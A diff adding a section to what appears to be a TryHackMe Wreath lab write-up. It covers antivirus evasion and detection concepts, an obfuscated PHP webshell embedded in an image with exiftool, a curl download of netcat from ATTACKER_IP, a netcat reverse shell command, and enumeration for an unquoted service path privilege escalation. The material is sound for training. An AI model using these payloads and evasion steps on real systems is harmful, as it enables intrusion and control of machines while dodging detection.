@@ -1892,3 +1892,271 @@ Note: The HTML form is configured to only allow image uploads through the GUI, s
 
 ![image](https://user-images.githubusercontent.com/89842187/132073835-8061aa81-be19-404c-b827-15b4ee2e7403.png)
 
+
+## AV Evasion Introduction
+
+Antivirus Evasion is the third and final primary teaching point of the Wreath network.
+
+By nature, AV Evasion is a rapidly changing topic. It's a constant dance between hackers and developers. Every time the developers release a new feature, the hackers develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. Due to the speed of this process, it is nigh impossible to teach bleeding-edge techniques (and expect them to stay relevant for any length of time), so we are only going to be covering the fundamentals of the topic here. Without further ado, let's dive in!
+
+When it comes to AV evasion we have two primary types available:
+
+- On-Disk evasion
+- In-Memory evasion
+On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (.exe) files.
+
+In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.
+
+In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the Anti-Malware Scan Interface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn't actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it's safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.
+
+In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as SharpEDRChecker and Seatbelt to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should always disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!
+
+AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.
+
+## AV Detection Methods
+
+Before we get into the practical side of things, let's talk a little about the different detection methods employed by antivirus software.
+
+Generally speaking, detection methods can be classified into one of two categories:
+
+Static Detection
+Dynamic / Heuristic / Behavioural Detection
+Modern Antivirus software will usually rely on a combination of these.
+
+Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change something when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system.
+
+Fortunately (or unfortunately for us as hackers), this is usually nowhere near enough to bypass static detection methods.
+
+The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching. Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.
+
+The tradeoff with this method is, of course, speed. Checking small sequences of bytes against a potentially huge program with multiple libraries can take a comparatively long time compared to the milliseconds it would take to hash the entire file and compare the hash against a database. As such, a compromise is sometimes made whereby the AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.
+
+Where static virus malware detection methods look at the file itself, dynamic methods look at how the file acts. There are a couple of ways to do this.
+
+AV software can go through the executable line-by-line checking the flow of execution. Based on pre-defined rules about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program intends to act, and make decisions accordingly
+The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware
+Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive, so we just need to look for various system values (e.g. is there a fan installed, is there a GUI, and if so, what resolution is it, are there any distinctive tools or services running -- VMtools for VMware virtual machines, for example) and check to see if there are any red flags. For example, a machine with no fan, no GUI and a classic VM service running is very likely to be a sandbox -- in which case the program should just exit. If the program exits without doing anything malicious then the AV software is fooled into believing that it's safe and allows it to be executed on the target.
+
+Equally, with logic-flow analysis, the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. has some random code that does the grand sum of nothing inserted into the exploit) then it will likely pass this detection method.
+
+In addition to this, when working with certain kinds of delivery methods, password protecting the file can get straight around the behavioural analysis checks as (unlike the user who knows the password), the AV software is unable to open and execute the file.
+
+That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it's doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer's available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.
+
+To make life harder still, antivirus vendors are usually in close contact with one another -- as well as with scanning sites such as VirusTotal. When the AV detects a suspicious file, it usually sends the file back to servers owned by the provider where it gets analysed and shared with other providers. What this means is that once our payload is detected on one computer, the chances are that it will quickly be taken apart and shielded against. This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.
+
+Additionally, new techniques are being developed all the time. For example, many attempts are being made to use machine learning techniques to dynamically update the list of bad behaviours in a sandbox environment, or the rule-lists used in logic-flow analysis of a suspicious file. If you're interested in some of the work being done in this area, TryHackMe's very own CMNatic https://cmnatic.co.uk/ did his dissertation on the subject, which can be read here. https://resources.cmnatic.co.uk/Presentations/Dissertation/
+
+## PHP Payload Obfuscation
+
+Now that we've covered the basic terminology, let's get back to hacking this PC!
+
+We have an upload point which we can use to upload PHP scripts. We now need to figure out how to make a PHP script that will bypass the antivirus software. Windows Defender is free and comes pre-installed with Windows Server, so let's assume that this is what is in use for the time being.
+
+The solution is this:
+We build a payload that does what we need it to do (preferably in a slightly less than common way), then we obfuscate it either manually or by using one of the many tools available online.
+
+First up, let's build that payload:
+
+```
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+```
+Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using shell_exec(), wrapped inside HTML <pre> tags to give us a clean output. We then use die() to prevent the rest of the image from showing up as garbled text on the screen.
+```
+This is slightly longer than the classic PHP one-liner webshell (<?php system($_GET["cmd"]);?>) for two reasons:
+
+If we're obfuscating it then it will become a one-liner anyway
+Anything different is good when it comes to AV evasion
+We now need to obfuscate this payload.
+
+There are a variety of measures we could take here, including but not limited to:
+
+- Switching parts of the exploit around so that they're in an unusual order
+- Encoding all of the strings so that they're not recognisable
+- Splitting up distinctive parts of the code (e.g. shell_exec($_GET[...]))
+
+
+Manual obfuscation is very much a thing, but for the sake of simplicity, let's just use one of the available online tools. The tool linked here is recommended. https://www.gaijin.at/en/tools/php-obfuscator When it comes to web obfuscation, these tools are generally used to make the code difficult for humans to read; however, by doing things like obfuscating variable/function names and encoding strings, they also prove effective against antivirus software.
+
+Stick the payload into the tool, then activate all the obfuscation options:
+
+![image](https://user-images.githubusercontent.com/89842187/132077235-1a06a4a2-2309-4865-8c5a-1d9738ffaab0.png)
+
+Click the "Obfuscate Source Code" button, and we're left with this mess of PHP:
+
+```
+<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
+```
+
+If you look closely you'll see that this is still very much the same payload as before; however, enough has changed that it should fool Defender.
+
+As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:
+
+```
+<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
+
+
+```
+With an obfuscated payload, we can now finalise our exploit.
+
+Once again, make a copy of an innocent image (ensuring you give it a name in the format of shell-USERNAME.jpeg.php), then use exiftool to embed the payload into the image:
+
+```
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
+```
+
+Upload your shell and attempt to access it!
+
+If this worked then you should get an output similar to the following:
+
+![image](https://user-images.githubusercontent.com/89842187/132077293-5a4c8687-ba3a-4a0a-a078-b29247b2b13f.png)
+
+Awesome! We have a shell.
+
+We can now execute commands using the wreath GET parameter, e.g:
+
+```
+http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo
+
+```
+
+## Compiling Netcat & Reverse Shell!
+
+Our webshell is all well and good, but let's go for a full reverse shell!
+
+Unfortunately, we have a problem. Unlike in Linux where there are usually many ways to obtain a reverse shell, the options in Windows are a lot fewer in number as Windows tends not to have many scripting languages installed by default.
+
+Realistically we have several options here:
+
+- Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
+- We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
+- We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the Veil Framework to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, shellter (though old) might give us what we need. There are easier options though.
+- We could upload netcat. This is the quick and easy option.
+
+The only problem with uploading netcat is that there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Fortunately there are many floating around! Let's use one from github, here.
+
+Clone the repository:
+git clone https://github.com/int0x33/nc.exe/
+
+This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you'd prefer to just use the default binaries then just skip to the last section of this task and use the nc64.exe binary from the repository.
+
+Cross compilation is an essential skill -- although in many ways it's preferable to avoid it.
+
+First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we're doing here), or even software for an embedded device or phone.
+
+Whilst cross-compilation is a very useful skill to have, it's often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it's essential that we get the same arch as that of the target -- a 64 bit program won't work very well on a 32 bit target!
+
+Sometimes it's easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the mingw-w64 package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:
+```
+sudo apt install mingw-w64
+```
+
+This is a big package, but once it's installed we can start re-compiling netcat.
+
+Much like we use gcc to compile binaries on Linux, we can use the mingw compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that's of particular importance to us here is x86_64-w64-mingw32-gcc. This specifies that we want to compile a 64bit binary.
+
+Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the Makefile with your favourite text editor. The first two lines specify which compiler to use:
+
+![image](https://user-images.githubusercontent.com/89842187/132077341-7495cdd8-0cf6-4266-ab0e-58cddb67d1a4.png)
+
+Neither of these are quite what we're looking for, so comment out the first line and add another line underneath:
+
+![image](https://user-images.githubusercontent.com/89842187/132077348-77fe4947-24f5-415b-8766-dc871393727f.png)
+
+Now when we run make to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to /dev/null in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.
+
+![image](https://user-images.githubusercontent.com/89842187/132077351-915d5179-06f2-4f97-ad96-673e6a2c5025.png)
+
+Despite it often being much harder to upload binaries to Windows than it is to upload to Linux, we do have a few options here.
+
+- Powershell might work, but with AMSI in play it's a risk.
+- We could use the file upload point that we originally exploited to upload an unrestricted PHP file uploader (in the same way that we uploaded the original webshell, although this would be a bit of a pain with embedding the uploader in an image).
+- We could look for other command line tools installed on the target such as curl.exe or certutil.exe, both of which might allow for a file upload.
+
+
+Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, but Defender flags this as malicious.
+
+Instead we'll stick with trusty old cURL.
+
+Use cURL to upload your new copy of netcat to the target:
+```
+curl http://ATTACKER_IP/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe
+
+We now have everything we need to get a reverse shell back from this target.
+
+Set up a netcat listener on your attacking machine, then, in your webshell, use the following command:
+powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe
+
+e.g.
+powershell.exe c:\\windows\\temp\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe
+
+This should result in a reverse shell from the target!
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132077375-3726efde-ac3d-4ec7-80ff-e703c4ecf22e.png)
+
+
+## Enumeration
+
+We have a reverse shell on the third and final target -- this is cause for celebration!
+
+We don't yet have full system access to the target though. As we saw when we first obtained the webshell, the webserver was (un)fortunately not running with system permissions (contrary to the Xampp defaults), which leaves us with a low-privilege account. Looks like Thomas was sensible with his security on his own PC!
+
+This does mean that we're going to need to enumerate the target for privesc vectors though -- and with Defender active, we'll have to do it quietly. Let's consider our options:
+
+- We could (and should) always start with a little manual enumeration. This will be relatively quiet and gives us a baseline to work with
+- Defender would definitely catch a regular copy of WinPEAS; however, it would be unlikely to catch either the .bat version or the obfuscated .exe version, both of which are released in the PEAS repository alongside the regular version
+- Chances are that AMSI will alert Defender if we try to load any PowerShell privesc check scripts (e.g. PowerUp), so we'd ideally be looking for obfuscated versions of these if we were to use them
+We'll start with some manual enumeration and hopefully come up with something workable!
+
+```
+Use the command whoami /priv.
+Now use whoami /groups to check the current user's groups.
+```
+
+Now that we've got an idea of our own user's capabilities. Let's take a look at the box itself.
+
+Windows services are commonly vulnerable to various attacks, so we'll start there. Generally speaking, it's unlikely that core Windows services will be vulnerable to anything -- user installed services are far more likely to have holes in them.
+
+Let's start by looking for non-default services:
+
+```
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+```
+
+This lists all of the services on the system, then filters so that only services that are not in the C:\Windows directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.
+
+There should be a bunch of results returned here. Read through them, paying particular attention to the PathName  column. Notice that one of the paths does not have quotation marks around it.
+
+
+The lack of quotation marks around this service path indicates that it might be vulnerable to an Unquoted Service Path attack. In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the NT AUTHORITY\SYSTEM account, we might be able to elevate privileges.
+
+First of all, let's check to see which account the service runs under:
+
+```
+sc qc SERVICE_NAME
+```
+
+Let's check the permissions on the directory. If we can write to it, we are golden:
+
+```
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132077436-c71ed712-46eb-4fca-8f92-d2fe2668879b.png)
+
+We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.
+
+ the interests of learning, it should be noted here that this is far from the only vulnerability here. By the looks of things, Thomas installed the program but couldn't be bothered entering the password for the Administrator account every time he needed to interact with it. As a result, he botched the permissions and gave every user access to every aspect of the program.
+
+This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.
+
+That said, we will stick to the unquoted service path vulnerability purely to avoid messing with the service itself. This way all we need to do is create our own binary then delete it, rather than alter any of the files in the service itself.
